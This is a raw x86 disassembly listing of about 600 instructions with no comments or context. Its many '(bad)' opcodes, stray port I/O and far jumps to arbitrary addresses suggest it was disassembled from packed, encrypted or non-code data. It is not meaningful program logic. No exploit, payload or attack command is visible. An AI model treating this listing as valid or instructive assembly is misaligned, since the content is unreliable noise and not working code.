  4235e4:	pop    ds
  4235e5:	ds out dx,al
  4235e7:	push   ds
  4235e8:	mov    edx,0x619233a3
  4235ed:	pusha  
  4235ee:	add    al,0xc1
  4235f0:	ins    DWORD PTR es:[edi],dx
  4235f1:	adc    ch,BYTE PTR [eax]
  4235f3:	cmp    cl,dl
  4235f5:	sbb    ch,BYTE PTR [edx-0x3a83b02a]
  4235fb:	jmp    DWORD PTR [edi]
  4235fd:	push   esp
  4235fe:	mov    edi,0x9a4f5b49
  423603:	dec    ebx
  423604:	sbb    BYTE PTR [ecx-0x50214a4d],ch
  42360a:	mov    ebp,0xe0133f6d
  42360f:	cwde   
  423610:	jmp    0x727c:0xec59d0e
  423617:	jl     0x4235c9
  423619:	push   ebx
  42361a:	cmp    eax,0x13702a3
  42361f:	adc    eax,edi
  423621:	retf   
  423622:	inc    edx
  423623:	not    DWORD PTR [edx+0x25]
  423626:	fld    DWORD PTR ds:0x12a240fa
  42362c:	fisttp DWORD PTR [ebp-0x20941d33]
  423632:	push   ecx
  423633:	add    dl,BYTE PTR cs:[esi]
  423636:	cmp    edx,DWORD PTR [edx+0x21]
  423639:	mov    bl,0xa1
  42363b:	and    eax,0x555c502b
  423640:	jnp    0x42363f
  423642:	jmp    0x72b0870d
  423647:	dec    ebx
  423648:	inc    edi
  423649:	and    DWORD PTR [edx-0x77],edx
  42364c:	cmp    eax,0x17eb68a3
  423651:	push   ecx
  423652:	cli    
  423653:	repnz mov edx,0xe2d3cb5c
  423659:	sbb    ch,bl
  42365b:	rcr    esp,cl
  42365d:	adc    ah,BYTE PTR [esi]
  42365f:	std    
  423660:	and    BYTE PTR [edx-0x377571a1],al
  423666:	dec    esi
  423667:	in     eax,0x8
  423669:	add    al,0x6d
  42366b:	jmp    0xd2033c63
  423670:	loop   0x423649
  423672:	add    edi,DWORD PTR [ecx+0x14]
  423675:	mov    ch,0xba
  423677:	inc    eax
  423678:	mov    WORD PTR [edi+0x4eb9c095],ds
  42367e:	jno    0x423631
  423680:	xchg   esi,eax
  423681:	lds    eax,FWORD PTR [edi-0x3fb49577]
  423687:	mov    esi,0x20f70c06
  42368c:	sbb    DWORD PTR [ecx+edx*8-0xa8f4bc1],edx
  423693:	and    ah,BYTE PTR [ecx-0x5113e54b]
  423699:	add    eax,0x1a4059b6
  42369e:	aad    0xd
  4236a0:	shl    DWORD PTR [ecx+0x303eea0a],cl
  4236a6:	rol    BYTE PTR [edi+0x45bc3266],0xbe
  4236ad:	(bad)  
  4236ae:	imul   ecx,DWORD PTR [ecx-0x27],0x57691f47
  4236b5:	inc    esp
  4236b6:	cmp    al,0x8d
  4236b8:	or     esi,eax
  4236ba:	fwait
  4236bb:	jp     0x4236b0
  4236bd:	xor    al,0xfa
  4236bf:	mov    dh,0xf
  4236c1:	aaa    
  4236c2:	out    0x1a,eax
  4236c4:	outs   dx,BYTE PTR ds:[esi]
  4236c5:	xchg   ebx,eax
  4236c6:	fs inc ecx
  4236c8:	(bad)  
  4236c9:	fist   WORD PTR [edi]
  4236cb:	aaa    
  4236cc:	pop    es
  4236cd:	sbb    esp,ebp
  4236cf:	mov    al,0xdf
  4236d1:	int    0x3
  4236d3:	xchg   edi,eax
  4236d4:	in     al,0x29
  4236d6:	rcr    DWORD PTR ds:0x2e2f59fb,1
  4236dc:	lds    ebx,FWORD PTR [edi-0x2]
  4236df:	jmp    0x4f2f9b2c
  4236e4:	cmp    DWORD PTR [edx+0x7104182f],esi
  4236ea:	js     0x4236de
  4236ec:	shr    DWORD PTR [ebx-0x42],cl
  4236ef:	and    bh,BYTE PTR [edx]
  4236f1:	and    bl,ch
  4236f3:	dec    ecx
  4236f4:	rcr    BYTE PTR [ebp+ebx*2-0x299f102a],cl
  4236fb:	add    eax,0x40d2152b
  423700:	add    eax,DWORD PTR [ebp+0x2a]
  423703:	cmp    BYTE PTR [edx-0x515e274b],cl
  423709:	mov    eax,ds:0xf820c99d
  42370e:	and    DWORD PTR [edx],ecx
  423710:	dec    esi
  423711:	sbb    dh,BYTE PTR [eax-0x6c]
  423714:	mov    edi,0xb3ff8ea6
  423719:	test   DWORD PTR [eax+0x5f],0xadf8d8c3
  423720:	outs   dx,BYTE PTR fs:[esi]
  423722:	out    dx,eax
  423723:	cli    
  423724:	mov    ds,ebp
  423726:	sbb    ch,BYTE PTR [edi]
  423728:	adc    DWORD PTR [ebx],ecx
  42372a:	pop    ebx
  42372b:	push   eax
  42372c:	dec    esi
  42372d:	mov    edx,0xf50bc8f
  423732:	call   0x1706dfcf
  423737:	jmp    0xd8c0deeb
  42373c:	jo     0x4236ca
  42373e:	shl    BYTE PTR [ecx+0x32],0xfc
  423742:	mov    ebx,eax
  423744:	push   0xed0b5eb4
  423749:	addr16 push esp
  42374b:	xchg   edi,eax
  42374c:	push   0x1c18ebf6
  423751:	mov    ah,0x98
  423753:	inc    edi
  423754:	mov    ah,0x77
  423756:	shr    bl,cl
  423758:	mov    bl,0xd8
  42375a:	cmp    BYTE PTR [edx+edx*2],0x7
  42375e:	dec    eax
  42375f:	mov    al,ds:0x353e7b0f
  423764:	sahf   
  423765:	push   ds
  423766:	js     0x423735
  423768:	xchg   edi,eax
  423769:	aad    0x26
  42376b:	sub    cl,BYTE PTR [esi+0x44]
  42376e:	lock mov ecx,0xb3dbb3be
  423774:	cs ins DWORD PTR es:[edi],dx
  423776:	into   
  423777:	out    0x8,al
  423779:	dec    esi
  42377b:	scas   eax,DWORD PTR es:[edi]
  42377c:	jge    0x423728
  42377e:	ds aaa 
  423780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423781:	push   0x64
  423783:	lds    ebx,FWORD PTR [ecx-0x4e]
  423786:	add    BYTE PTR [edi+eiz*2-0x6a],0x3d
  42378b:	adc    DWORD PTR [esi],ebp
  42378d:	in     eax,dx
  42378e:	popf   
  42378f:	dec    ebp
  423790:	pop    ebx
  423791:	sar    ah,1
  423793:	fiadd  DWORD PTR [esi]
  423795:	mov    esi,0xc865748f
  42379a:	mov    cs,WORD PTR [ebx-0x5]
  42379d:	lock or DWORD PTR [edx-0x1],esi
  4237a1:	push   ebx
  4237a2:	mov    DWORD PTR ds:0xbaaada60,eax
  4237a8:	mov    WORD PTR [ecx-0x17],fs
  4237ab:	jmp    0x423778
  4237ad:	sub    DWORD PTR [esi-0x30],0xc849cdc4
  4237b4:	popa   
  4237b5:	out    0xc5,al
  4237b7:	adc    ch,dh
  4237b9:	inc    esi
  4237ba:	adc    ebx,esp
  4237bc:	aam    0xf9
  4237be:	sbb    al,bl
  4237c0:	xor    ch,BYTE PTR [ebp-0x48]
  4237c3:	inc    edi
  4237c4:	push   edi
  4237c5:	add    edi,DWORD PTR [eax+0x27]
  4237c8:	or     BYTE PTR [esi+0x364540d7],dl
  4237ce:	repz jmp 0x504e:0x8830bc32
  4237d6:	shl    DWORD PTR [ecx+edi*8-0x66],0xb6
  4237db:	mov    bl,0x37
  4237dd:	push   ebp
  4237de:	ins    WORD PTR es:[edi],dx
  4237e0:	inc    edi
  4237e1:	sub    BYTE PTR [eax+0x1b],bl
  4237e4:	and    al,0x11
  4237e6:	xor    dh,ah
  4237e8:	pop    esp
  4237e9:	mov    WORD PTR [esi-0x659b1d4d],ds
  4237ef:	std    
  4237f0:	pop    ebx
  4237f1:	cmp    dh,BYTE PTR [ecx-0x6ff1b478]
  4237f7:	dec    ebx
  4237f8:	mov    al,ds:0x803a9dd2
  4237fe:	or     esi,esp
  423800:	pavgw  mm7,QWORD PTR [edx+0x4870cb26]
  423807:	mov    edi,0xa60fd594
  42380c:	stos   DWORD PTR es:[edi],eax
  42380d:	sbb    al,0x1a
  42380f:	jmp    0x423801
  423811:	xlat   BYTE PTR ds:[ebx]
  423812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423813:	mov    edi,0x8d2b8a1a
  423818:	xchg   esi,eax
  423819:	cwde   
  42381a:	cld    
  42381b:	mov    DWORD PTR [esi-0x68255521],edx
  423821:	pop    ss
  423822:	push   esi
  423823:	std    
  423824:	daa    
  423825:	xchg   esp,eax
  423826:	call   FWORD PTR [edx-0x51]
  423829:	inc    esp
  42382a:	rcl    DWORD PTR [esi-0x3f],1
  42382d:	sar    BYTE PTR [edx+0x71],1
  423830:	pusha  
  423831:	(bad)  
  423832:	push   eax
  423833:	nop
  423834:	daa    
  423835:	add    esi,edx
  423837:	cmp    BYTE PTR [edi+0x23d95d0e],ah
  42383d:	lods   eax,DWORD PTR ds:[esi]
  42383e:	das    
  42383f:	jb     0x423802
  423841:	mov    eax,ds:0xb9db51e3
  423846:	es adc al,0x2d
  423849:	jb     0x4237eb
  42384b:	cmp    al,0x84
  42384d:	xlat   BYTE PTR ds:[ebx]
  42384e:	clc    
  42384f:	pop    ds
  423850:	inc    ebp
  423851:	clc    
  423852:	push   eax
  423853:	add    DWORD PTR [edx+edx*2+0x6c],edx
  423857:	jbe    0x4238b3
  423859:	leave  
  42385a:	test   DWORD PTR [ebx+0x34360661],0x3b527747
  423864:	push   eax
  423865:	and    ah,BYTE PTR [ebx-0x24622cb7]
  42386b:	sbb    ebp,esi
  42386d:	adc    DWORD PTR [esi],edx
  42386f:	sbb    eax,0x5643da1b
  423874:	stc    
  423875:	cld    
  423876:	cs push ebx
  423878:	stc    
  423879:	shl    BYTE PTR [ebx],0xd8
  42387c:	cmp    eax,0x7d582067
  423881:	ss mov dh,0xa5
  423884:	int3   
  423885:	cdq    
  423886:	and    al,0xca
  423888:	jmp    0x4238d5
  42388a:	pushf  
  42388b:	mov    cl,0xbc
  42388d:	jns    0x423849
  42388f:	ds popa 
  423891:	es (bad) 
  423893:	les    eax,FWORD PTR [eax]
  423895:	popa   
  423896:	sbb    eax,0xf0e54ee6
  42389b:	jp     0x423858
  42389d:	cmc    
  42389e:	ds stc 
  4238a0:	adc    eax,0xdfe9f43a
  4238a5:	jl     0x4238cf
  4238a7:	sbb    al,BYTE PTR [ebx+edx*2+0x1e]
  4238ab:	xchg   esi,eax
  4238ac:	int    0x1c
  4238ae:	call   FWORD PTR [edi]
  4238b0:	sub    ebx,DWORD PTR [ebp-0x7a]
  4238b3:	pop    edi
  4238b4:	hlt    
  4238b5:	cmp    BYTE PTR [ecx+0x68ed402e],bh
  4238bb:	mov    bh,0xc0
  4238bd:	test   DWORD PTR [ebx+0x28],0x3da0be53
  4238c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238c5:	je     0x4238f8
  4238c7:	jle    0x423851
  4238c9:	sub    DWORD PTR [ebp+0x4d],esp
  4238cc:	test   eax,0x45397b86
  4238d1:	popf   
  4238d2:	js     0x4238f5
  4238d4:	stos   DWORD PTR es:[edi],eax
  4238d5:	and    ah,BYTE PTR [ebx+0x5e73f550]
  4238db:	repz adc BYTE PTR [eax*4+0x34579534],bh
  4238e3:	sbb    al,0x40
  4238e5:	sti    
  4238e6:	in     eax,0xa2
  4238e8:	(bad)  
  4238e9:	neg    DWORD PTR [ebx-0x2548806a]
  4238ef:	add    al,bh
  4238f1:	addr16 retf 
  4238f3:	lahf   
  4238f4:	cmp    BYTE PTR [eax],dh
  4238f6:	in     eax,dx
  4238f7:	mov    DWORD PTR [eax+0x37],esp
  4238fa:	dec    esp
  4238fb:	(bad)  
  4238fc:	mov    ah,0x15
  4238fe:	inc    eax
  4238ff:	mov    BYTE PTR [ebx+0x28],al
  423902:	mov    ebx,0x3fe01208
  423907:	fbld   TBYTE PTR ss:[ecx]
  42390a:	sbb    esp,DWORD PTR [ebp+0x66]
  42390d:	mov    al,ds:0xa730c9e3
  423912:	sar    BYTE PTR [eax],1
  423914:	inc    ecx
  423915:	mov    al,BYTE PTR [ecx-0x56]
  423918:	or     esi,ecx
  42391a:	mov    edx,0x3d76de42
  42391f:	pop    esp
  423920:	mov    edx,0xee22fe76
  423925:	test   al,0x6d
  423927:	loopne 0x42391a
  423929:	mov    eax,DWORD PTR [ecx]
  42392b:	ror    BYTE PTR [ecx+0x48],cl
  42392e:	adc    DWORD PTR [ecx-0x41],edi
  423931:	out    dx,al
  423932:	mov    ds:0xa53371e,eax
  423937:	sbb    eax,0x8e6b1a27
  42393c:	ins    DWORD PTR es:[edi],dx
  42393d:	jns    0x4238c6
  42393f:	mov    al,ds:0x3fc30c8c
  423944:	cs leave 
  423946:	in     eax,0xf5
  423948:	and    esp,edx
  42394a:	rcr    BYTE PTR [eax-0x21],1
  42394d:	imul   edx,esp,0xcbb7cda1
  423953:	push   eax
  423954:	imul   esi,eax,0x26ce3cb3
  42395a:	fistp  QWORD PTR [ebx+0x5f9f2081]
  423960:	or     BYTE PTR [ecx-0x21],ch
  423963:	sub    edi,edx
  423965:	into   
  423966:	push   edi
  423967:	mov    ecx,0x2138dd98
  42396d:	es mov edx,0x17556ecc
  423973:	nop
  423974:	xchg   ah,bl
  423976:	sbb    edi,ebp
  423978:	in     al,dx
  423979:	mov    bl,0x99
  42397b:	push   ebp
  42397c:	xor    eax,0xb9a415e6
  423981:	jns    0x423999
  423983:	ret    
  423984:	jb     0x42394c
  423986:	add    ebx,ecx
  423988:	clc    
  423989:	mov    ebx,0x9048656
  42398e:	sbb    ecx,DWORD PTR [eax+ebp*8+0x3e]
  423992:	add    bl,cl
  423994:	mov    ds:0xa8c8c7c0,al
  423999:	inc    esp
  42399a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42399b:	loopne 0x423942
  42399d:	dec    ebp
  42399e:	sbb    eax,0x6d5da04e
  4239a3:	add    DWORD PTR [edx+ecx*8+0x51],esp
  4239a7:	iret   
  4239a8:	cmp    eax,0x80b278b3
  4239ad:	aam    0x5c
  4239af:	xor    BYTE PTR [edx+0x163dec28],bh
  4239b5:	mov    ds:0x89d0e4bf,eax
  4239ba:	loop   0x423a24
  4239bc:	inc    ebp
  4239bd:	sub    al,0xb
  4239bf:	dec    ebp
  4239c0:	sbb    dh,BYTE PTR [ebx+0x4]
  4239c3:	jae    0x4239cd
  4239c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239c6:	dec    ebx
  4239c7:	adc    DWORD PTR [edi+edx*2+0x331b934],0xd7c70155
  4239d2:	xor    eax,DWORD PTR [ebx-0x5795aa2a]
  4239d8:	jg     0x423a3f
  4239da:	xor    al,0x13
  4239dc:	out    0x15,al
  4239de:	sbb    DWORD PTR [edi-0x40],edi
  4239e1:	sbb    DWORD PTR [esi+0x2c],0xffffff85
  4239e5:	lods   al,BYTE PTR ds:[esi]
  4239e6:	xor    BYTE PTR [ecx+esi*1-0x172e6177],dl
  4239ed:	xlat   BYTE PTR ds:[ebx]
  4239ee:	cmp    BYTE PTR [ecx-0x42],ah
  4239f1:	imul   esp,DWORD PTR [edx],0x7e841b90
  4239f7:	sub    bl,al
  4239f9:	xchg   edi,eax
  4239fa:	sbb    ebx,DWORD PTR [esi-0x6e]
  4239fd:	push   ss
  4239fe:	and    BYTE PTR [esi],0x4c
  423a01:	inc    eax
  423a02:	in     eax,dx
  423a03:	jp     0x4239bf
  423a05:	and    DWORD PTR [edi+0x41],edx
  423a08:	xchg   ebx,eax
  423a09:	retf   
  423a0a:	adc    eax,DWORD PTR [ebx+0x15]
  423a0d:	mov    esp,0x6b72166b
  423a12:	stc    
  423a13:	mov    bh,BYTE PTR ds:0x673d4de3
  423a19:	repnz mov dh,0xf3
  423a1c:	ja     0x423a0c
  423a1e:	call   FWORD PTR [eax-0x7b]
  423a21:	adc    bh,BYTE PTR [eax+0x6d]
  423a24:	xor    BYTE PTR ds:0x1cc1789e,bh
  423a2a:	mov    ah,0x5c
  423a2c:	rol    BYTE PTR [edx+0x268e4370],cl
  423a32:	sbb    al,0xe4
  423a34:	xchg   ecx,eax
  423a35:	pop    esp
  423a36:	mov    ebx,0xd8759b6e
  423a3b:	pop    ebp
  423a3c:	sbb    eax,DWORD PTR [ebx-0x73eb9a4c]
  423a42:	imul   ecx,esi,0x1b
  423a45:	sub    ch,dh
  423a47:	stc    
  423a48:	pop    ecx
  423a49:	and    dh,bh
  423a4b:	push   edx
  423a4c:	ret    0x7331
  423a4f:	sbb    ebx,edi
  423a51:	push   ebp
  423a52:	dec    esp
  423a53:	dec    ebx
  423a54:	std    
  423a55:	pop    eax
  423a56:	shl    DWORD PTR fs:[edx+esi*1-0x60],0x57
  423a5c:	mov    eax,ds:0x59cbaddf
  423a61:	adc    esi,edx
  423a63:	push   esp
  423a64:	and    eax,0x80cdfce6
  423a69:	mov    ebx,DWORD PTR [ebx]
  423a6b:	gs clc 
  423a6d:	mov    esi,0x27d858f7
  423a72:	fstp   DWORD PTR [ebp-0x32]
  423a75:	addr16 mov bh,0xdb
  423a78:	mov    DWORD PTR ds:0x2da144f9,eax
  423a7e:	mov    bl,0x47
  423a80:	into   
  423a81:	ret    
  423a82:	and    eax,0xb11b5b6b
  423a87:	icebp  
  423a88:	xchg   ebx,eax
  423a89:	repnz push 0x77217665
  423a8f:	in     al,0x88
  423a91:	repz xchg esi,eax
  423a93:	std    
  423a94:	int3   
  423a95:	pushf  
  423a96:	or     BYTE PTR [esi+0x45610d31],dh
  423a9c:	dec    eax
  423a9d:	ins    DWORD PTR es:[edi],dx
  423a9e:	enter  0xfad2,0xf4
  423aa2:	out    dx,al
  423aa3:	daa    
  423aa4:	xor    al,BYTE PTR [ecx-0x4b101fcc]
  423aaa:	and    cl,BYTE PTR [edi]
  423aac:	lods   al,BYTE PTR ds:[esi]
  423aad:	js     0x423aba
  423aaf:	scas   al,BYTE PTR es:[edi]
  423ab0:	sti    
  423ab1:	xchg   DWORD PTR [eax-0x5a],ecx
  423ab4:	aaa    
  423ab5:	mov    ebp,0xdedc524c
  423aba:	lds    ebx,FWORD PTR [edi]
  423abc:	fwait
  423abd:	push   cs
  423abe:	xchg   esi,eax
  423abf:	enter  0xfe16,0x24
  423ac3:	or     DWORD PTR [ecx+eax*8-0x2e],edx
  423ac7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ac8:	mov    ds:0xdc30d2cb,al
  423acd:	sbb    dh,BYTE PTR [esi-0x1c]
  423ad0:	sub    eax,0x9f3b6425
  423ad5:	inc    esp
  423ad6:	inc    eax
  423ad7:	mov    edi,0x73d43510
  423adc:	maxps  xmm5,XMMWORD PTR [esi+0x18]
  423ae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ae1:	jno    0x423b23
  423ae3:	push   ebp
  423ae4:	(bad)  
  423ae5:	in     eax,0x42
  423ae7:	xor    bl,BYTE PTR [esp+ecx*4]
  423aea:	leave  
  423aeb:	aaa    
  423aec:	ins    DWORD PTR es:[edi],dx
  423aed:	jmp    0x46d63077
  423af2:	jbe    0x423b6e
  423af4:	and    al,0xcc
  423af6:	repnz adc esi,DWORD PTR [ecx+0x54]
  423afa:	shl    DWORD PTR [edx-0x855d609],cl
  423b00:	iret   
  423b01:	dec    ebp
  423b02:	mov    eax,ds:0xedf0ff34
  423b07:	xor    cl,bh
  423b09:	pushf  
  423b0a:	xor    eax,0xf9710a2f
  423b0f:	sbb    eax,0xde4dffdb
  423b14:	cmp    BYTE PTR [eax],0x3c
  423b17:	mov    cl,0xcd
  423b19:	pop    ecx
  423b1a:	cs scas al,BYTE PTR es:[edi]
  423b1c:	jae    0x423b42
  423b1e:	fs in  al,0xf8
  423b21:	push   ebp
  423b22:	mov    edi,0x7e97326a
  423b27:	dec    ebp
  423b28:	add    ebx,DWORD PTR [ebx]
  423b2a:	pop    ebx
  423b2b:	push   ecx
  423b2c:	cdq    
  423b2d:	cmp    DWORD PTR [edi+0x61d1b9aa],esp
  423b33:	imul   ebp,DWORD PTR [edx-0x1b438272],0x75
  423b3a:	add    al,0x4
  423b3c:	pop    ecx
  423b3d:	rcr    DWORD PTR [ebx],1
  423b3f:	scas   eax,DWORD PTR es:[edi]
  423b40:	or     al,cl
  423b42:	and    DWORD PTR [eax+0x69c2307],ebx
  423b48:	mov    ebp,0xaf39628e
  423b4d:	adc    dl,0x59
  423b50:	call   0x2c5233d7
  423b55:	mov    ds,edi
  423b57:	pop    ebx
  423b58:	mov    dh,BYTE PTR ds:0xeba0aff5
  423b5e:	scas   al,BYTE PTR es:[edi]
  423b5f:	lock pusha 
  423b61:	(bad)  
  423b62:	pop    eax
  423b63:	pop    esi
  423b64:	xchg   ebx,eax
  423b65:	mov    bh,0xa4
  423b67:	mov    dl,0xd7
  423b69:	in     eax,dx
  423b6a:	and    eax,0xbe03dde1
  423b6f:	jl     0x423bcb
  423b71:	cmc    
  423b72:	pop    ebx
  423b73:	and    ah,bh
  423b75:	stc    
  423b76:	(bad)  
  423b77:	retf   
  423b78:	or     edx,DWORD PTR [esi]
  423b7a:	(bad)  
  423b7b:	test   al,0x14
  423b7d:	nop
  423b7e:	shl    DWORD PTR [esp+edi*2],0xb8
  423b82:	in     al,dx
  423b83:	out    0xfe,al
  423b85:	addr16 cmp ebp,eax
  423b88:	xlat   BYTE PTR ds:[ebx]
  423b89:	sbb    BYTE PTR [edi+0x56ca1c75],al
  423b8f:	xchg   edi,eax
  423b90:	xchg   ecx,eax
  423b91:	jg     0x423c03
  423b93:	inc    esp
  423b94:	lods   al,BYTE PTR ds:[esi]
  423b95:	push   0xb
  423b97:	retf   0x4250
  423b9a:	push   0xe4e5341c
  423b9f:	add    al,0x14
  423ba1:	xor    edi,eax
  423ba3:	pop    esi
  423ba4:	mov    ds:0x927c7f0,eax
  423ba9:	mov    ds:0x1b0e453a,eax
  423bae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423baf:	jb     0x423b69
  423bb1:	pop    eax
  423bb2:	ss pop esi
  423bb4:	mov    ah,0xe4
  423bb6:	adc    BYTE PTR [esi-0x391ccecd],dh
  423bbc:	xchg   ebp,eax
  423bbd:	mov    ds:0x63ca24cc,al
  423bc2:	inc    ebx
  423bc3:	mov    dh,0xe7
  423bc5:	jae    0x423c45
  423bc7:	cmp    al,0xb9
  423bc9:	and    bl,BYTE PTR [edi-0x7f]
  423bcc:	scas   al,BYTE PTR es:[edi]
  423bcd:	rcr    ah,0xb8
  423bd0:	test   ah,bl
  423bd2:	push   ds
  423bd3:	push   0xeea97d7e
  423bd8:	pop    ebp
  423bd9:	call   0x6d8dcafb
  423bde:	xor    eax,DWORD PTR [esi+0x2e]
  423be1:	xchg   edx,eax
  423be2:	jp     0x423b77
  423be4:	test   DWORD PTR [esi],ebp
  423be6:	jnp    0x423b9d
  423be8:	mov    esi,0xb52d5e30
  423bed:	cmp    DWORD PTR [esp+ecx*4],esp
  423bf0:	dec    esp
  423bf1:	aad    0x4a
  423bf3:	lods   eax,DWORD PTR ds:[esi]
  423bf4:	pop    ss
  423bf5:	in     eax,dx
  423bf6:	pushf  
  423bf7:	pop    ebp
  423bf8:	scas   al,BYTE PTR es:[edi]
  423bf9:	mov    esi,0x1bb53577
  423bfe:	sub    al,0xba
  423c00:	jae    0x423b9a
  423c02:	out    dx,al
  423c03:	stc    
  423c04:	inc    ebp
  423c05:	xor    al,0x70
  423c07:	inc    esi
  423c08:	div    DWORD PTR [eax-0x597a223a]
  423c0e:	xor    edx,DWORD PTR ds:0xeaf5a06
  423c14:	pop    ebx
  423c15:	enter  0x5729,0x8d
  423c19:	icebp  
  423c1a:	sbb    DWORD PTR [edx+0x3f],edx
  423c1d:	in     al,0x51
  423c1f:	addr16 mov al,0x97
  423c22:	jo     0x423bea
  423c24:	jnp    0x423c19
  423c26:	test   DWORD PTR [edx-0x48],ebx
  423c29:	xchg   edi,eax
  423c2a:	or     dl,BYTE PTR [ebp-0x258973cd]
  423c30:	dec    edi
  423c31:	jns    0x423c85
  423c33:	add    al,0xe8
  423c35:	push   esp
  423c36:	adc    eax,0xe441a4f
  423c3b:	jle    0x423c7e
  423c3d:	and    BYTE PTR [ebx-0x4f],0x3d
  423c41:	in     eax,0x5b
  423c43:	push   ss
  423c44:	stos   BYTE PTR es:[edi],al
  423c45:	aad    0x96
  423c47:	stc    
  423c48:	push   edi
  423c49:	pop    edx
  423c4a:	sub    edi,DWORD PTR [ebp-0x43]
  423c4d:	ins    BYTE PTR es:[edi],dx
  423c4e:	not    BYTE PTR [ebx+0x71]
  423c51:	pop    ss
  423c52:	out    dx,al
  423c53:	cwde   
  423c54:	popf   
  423c55:	ror    DWORD PTR [edi+0x7d5ab0f],cl
  423c5b:	popf   
  423c5c:	data16 cmp BYTE PTR [edx+0x28a8e15a],cl
  423c63:	add    al,0x9f
  423c65:	add    edi,DWORD PTR [esi+ebx*2]
  423c68:	js     0x423bf5
  423c6a:	xchg   edx,eax
  423c6b:	push   ebx
  423c6c:	inc    esi
  423c6d:	dec    esi
  423c6e:	mov    WORD PTR [edi-0x4a],cs
  423c71:	dec    ebp
  423c72:	jb     0x423c5b
  423c74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c75:	xor    DWORD PTR [edx+ebx*2],edi
  423c78:	shr    BYTE PTR [ecx-0x7e280c4a],0x66
  423c7f:	sbb    esi,DWORD PTR [ecx]
  423c81:	xor    bh,dh
  423c83:	fidivr WORD PTR ds:0x33b7b459
  423c89:	test   BYTE PTR [edx-0x25],bh
  423c8c:	adc    al,0xcd
  423c8e:	cdq    
  423c8f:	fidiv  DWORD PTR [edi+0x250d7a9b]
  423c95:	xor    al,0xc5
  423c97:	dec    edi
  423c98:	mov    esi,0xbb61e995
  423c9d:	ss test eax,0x11cf3d72
  423ca3:	mov    bh,0x3b
  423ca5:	adc    bl,BYTE PTR [edx]
  423ca7:	bound  eax,QWORD PTR [ebp-0x5ea01af5]
  423cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cae:	sahf   
  423caf:	or     al,0x6a
  423cb1:	shr    DWORD PTR [eax*1-0x15f97fd5],0x73
  423cb9:	sbb    DWORD PTR [eax-0x305027c4],edx
  423cbf:	or     BYTE PTR [esi],bl
  423cc1:	test   eax,0x764dac2c
  423cc6:	push   ebx
  423cc7:	push   esp
  423cc8:	(bad)  
  423cc9:	retf   0xb99c
  423ccc:	retf   
  423ccd:	pop    dx
  423ccf:	jg     0x423d0c
  423cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cd2:	cs dec edi
  423cd4:	aaa    
  423cd5:	js     0x423c89
  423cd7:	jae    0x423cc3
  423cd9:	jge    0x423cdf
  423cdb:	inc    esi
  423cdc:	clc    
  423cdd:	mov    bl,0xa4
  423cdf:	sub    eax,ebp
  423ce1:	int    0x32
  423ce3:	cdq    
  423ce4:	xlat   BYTE PTR ds:[ebx]
  423ce5:	adc    DWORD PTR [ecx-0x581fd7b8],edx
  423ceb:	pop    eax
  423cec:	mov    cl,0x49
  423cee:	xchg   ecx,eax
  423cef:	outs   dx,BYTE PTR ds:[esi]
  423cf0:	lea    ecx,[eax+0x317e7d55]
  423cf6:	scas   al,BYTE PTR es:[edi]
  423cf7:	stos   BYTE PTR es:[edi],al
  423cf8:	dec    edx
  423cf9:	mov    al,0x23
  423cfb:	cmp    al,0x2b
  423cfd:	mov    ds:0xad21a91d,al
  423d02:	push   eax
  423d03:	jns    0x423cd4
  423d05:	aas    
  423d06:	sbb    bl,BYTE PTR ds:0xe5f5370
  423d0c:	nop
  423d0d:	or     DWORD PTR [ebp+ecx*8-0x77],edx
  423d11:	sbb    ebp,esi
  423d13:	mov    ebp,0xdb161947
  423d18:	adc    al,0x96
  423d1a:	sub    DWORD PTR [ebx+0x51f172a0],ebx
  423d20:	stos   DWORD PTR es:[edi],eax
  423d21:	fisttp DWORD PTR [edi]
  423d23:	cmc    
  423d24:	stc    
  423d25:	inc    esp
  423d26:	out    dx,eax
  423d27:	mov    ds:0x1e8b8c45,eax
  423d2c:	bound  esi,QWORD PTR [eax+0x2a]
  423d2f:	push   esi
  423d30:	popf   
  423d31:	cmc    
  423d32:	hlt    
  423d33:	(bad)  
  423d34:	fadd   DWORD PTR [ebp-0x120a5837]
  423d3a:	push   0x73a68594
  423d3f:	call   0x4bda:0xfc40a1b9
  423d46:	jg     0x423dbe
  423d48:	gs popf 
  423d4a:	jnp    0x423d6c
  423d4c:	rcl    BYTE PTR [esi-0x19d309ba],cl
  423d52:	lds    edx,FWORD PTR ds:0xa1c42c9a
  423d58:	sub    bl,BYTE PTR [eax-0x29aa5728]
  423d5e:	data16 ds xor al,0x80
  423d62:	aad    0xeb
  423d64:	aad    0x1e
  423d66:	adc    cl,bh
  423d68:	das    
  423d69:	cdq    
  423d6a:	or     edx,ebp
  423d6c:	jle    0x423d81
  423d6e:	fmulp  st(5),st
  423d70:	jecxz  0x423cf2
  423d72:	cmp    dh,BYTE PTR [edx]
  423d74:	dec    ebx
  423d75:	loope  0x423d07
  423d77:	pop    edx
  423d78:	sub    esp,DWORD PTR [eax-0x2bff54db]
  423d7e:	xor    al,0xd4
  423d80:	lds    ebp,FWORD PTR [ecx-0x6a]
  423d83:	pusha  
  423d84:	sub    BYTE PTR [ecx-0x76],ah
  423d87:	in     al,0xe4
  423d89:	stc    
  423d8a:	scas   al,BYTE PTR es:[edi]
  423d8b:	std    
  423d8c:	out    dx,eax
  423d8d:	and    BYTE PTR [eax-0x63],0x68
  423d91:	add    eax,0x51166d0a
  423d97:	popf   
  423d98:	pop    ds
  423d99:	scas   al,BYTE PTR es:[edi]
  423d9a:	ins    BYTE PTR es:[edi],dx
  423d9b:	mov    dl,0xb2
  423d9d:	dec    ecx
  423d9e:	jnp    0x423dbf
  423da0:	ds lahf 
  423da2:	jo     0x423daf
  423da4:	dec    eax
  423da5:	pop    ss
  423da6:	mov    al,0x81
  423da8:	inc    edi
  423da9:	jo     0x423dc5
  423dab:	and    esp,DWORD PTR cs:[esi]
  423dae:	sahf   
  423daf:	loop   0x423d86
  423db1:	jmp    0x423da0
